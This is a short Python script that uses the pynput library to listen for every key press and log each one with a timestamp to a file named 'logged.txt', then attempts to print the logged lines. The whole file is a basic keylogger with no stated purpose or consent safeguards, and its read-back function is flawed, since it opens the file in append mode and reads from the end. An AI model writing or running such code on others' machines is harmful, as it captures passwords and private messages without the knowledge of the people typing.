from pynput.keyboard import Key, Listener
import logging

def main():
    logging.basicConfig(filename='logged.txt', level=logging.DEBUG, format='%(asctime)s:%(name)s:%(levelname)s:%(message)s')

    def on_press(Key):
        logging.info(str(Key))

    with Listener(on_press=on_press) as listener:
        listener.join()
        outputLogs()

def outputLogs():
    with open('logged.txt', 'ab+') as lfIN:
        for log in lfIN:
            print(log.split(':'))

if __name__ == '__main__':
    main()
